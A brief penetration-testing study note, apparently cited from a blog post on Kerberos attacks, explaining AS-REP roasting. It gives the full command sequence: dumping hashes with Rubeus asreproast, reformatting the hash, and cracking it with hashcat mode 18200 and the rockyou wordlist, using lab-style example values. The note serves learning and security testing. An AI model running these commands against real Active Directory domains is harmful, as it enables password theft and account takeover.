https://blog.xpnsec.com/kerberos-attacks-part-2/

AS-REP roasting is a technique that allows retrieving password hashes for users that have do not have Kerberos pre-authentication property selected:

![[image.png]]

```
.\Rubeus.exe asreproast

# Get a hash like this
$krb5asrep$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$

# Add the $23$
$krb5asrep$23$spot@offense.local:3171ea207b3a6fdaee52ba247c20362e$

# Crack it
hashcat -m18200 '$krb5asrep$23$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$' -a 3 /usr/share/wordlists/rockyou.txt
```
